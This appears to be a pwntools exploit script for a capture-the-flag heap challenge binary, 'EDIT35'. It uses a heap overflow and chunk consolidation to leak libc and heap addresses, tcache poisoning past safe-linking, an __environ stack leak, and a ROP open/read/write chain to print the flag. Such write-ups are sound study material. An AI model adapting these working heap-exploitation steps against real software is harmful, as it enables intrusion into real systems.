#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
#context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./EDIT35')
libc = ELF('./libc.so.6')
elf = ELF('./EDIT35')

def pr(a,addr):
	log.success(a+': '+hex(addr))

def add(length,content='A'):
	p.sendlineafter(':','1')
	p.sendlineafter('len:',str(length))
	p.sendafter('please input content:',content)

def delete(idx):
	p.sendlineafter(':','2')
	p.sendlineafter('idx:',str(idx))

def edit(idx,size,content):
	p.sendlineafter(':','3')
	p.sendlineafter('idx:',str(idx))
	p.sendlineafter(':',str(size))
	p.sendafter("content of heap:",content)

def show(idx):
	p.sendlineafter(':','4')
	p.sendlineafter('idx:',str(idx))

#=========================libcbase=============================

add(0x10) #0
add(0x420) #1
add(0x420) #2
add(0x420) #3
add(0x10) #4

edit(0, 0x20, '\x00'*0x18 + p64(0x861)) # 修改 chunk3 pre_size 
delete(1)
delete(3) # chunk 1 2 3 合并
add(0x420) #5

show(2)
libcbase = u64(p.recv(6).ljust(8, "\x00")) - 0x219ce0 # unsoretedbin 与 libc 偏移 == 0x219ce0
pr('libcbase',libcbase)

#=========================key-heapbase=========================

add(0x860) #6
show(2)
key = u64(p.recv(24)[-8:].ljust(8, "\x00")) >> 12 # heap >> 12
heapbase = key << 12
pr('heapbase',heapbase)
pr('key',key)

#==============================================================

syscall_ret = libcbase + libc.search(asm('syscall\nret')).next()
environ_addr = libcbase + libc.sym['__environ']
bss_addr = libcbase + libc.bss()
prdx_ret = libcbase + 0x11f497 # pop rdx ; pop r12 ; ret
prdi_ret = libcbase + 0x2a3e5  # pop rdi ; ret
prsi_ret = libcbase + 0x2be51  # pop rsi ; ret
prax_ret = libcbase + 0x45eb0  # pop rax ; ret

#==========================_stack==============================
#在 unsortedbin 中分配两个块，可以控制的是 7 (即chunk2的指针) ，10是为了防止 7 8 9 释放后和 unsortedbin 合并

add(0x100) #7 
add(0x100) #8
add(0x100) #9
add(0x10) #10
delete(8) # tcachebin
delete(7) # tcachebin
environ = key ^ (environ_addr - 0x10)
edit(2, 0x10, p64(environ))
add(0x500) #11 让 unsortedbin 全部使用防止后面块从这里分配

add(0x100) #12 tcachebin
add(0x100, '\x00'*0x10) #13 分配到 chunk2->fd 指向地址 environ

show(13)
stack = u64(p.recv(24)[-8:].ljust(8,'\x00')) # 泄露 environ 栈地址
ret_addr = stack - 0x148 # 程序 ret 地址
pr('stack_addr',stack - 0x8)
pr('ret_addr',ret_addr)

#============================ret===============================

delete(9)
delete(12)
ret = key ^ ret_addr
edit(2, 0x10, p64(ret))
add(0x100) #14 tcachebin

#=============================orw==============================

# open
payload  = b'./flag\x00\x00' # ret
payload += p64(prdi_ret) + p64(ret_addr) 
payload += p64(prsi_ret) + p64(0)
payload += p64(prax_ret) + p64(2)
payload += p64(syscall_ret)

#read
payload += p64(prdi_ret) + p64(3)
payload += p64(prsi_ret) + p64(bss_addr)
payload += p64(prdx_ret ) + p64(0x30) + p64(0)
payload += p64(prax_ret) + p64(0)
payload += p64(syscall_ret)

#write
payload += p64(prdi_ret) + p64(1)
payload += p64(prsi_ret) + p64(bss_addr)
payload += p64(prdx_ret ) + p64(0x30) + p64(0)
payload += p64(prax_ret) + p64(1)
payload += p64(syscall_ret)

#==============================================================

add(0x100, payload) #15 分配到 chunk2->fd 指向地址

p.interactive()
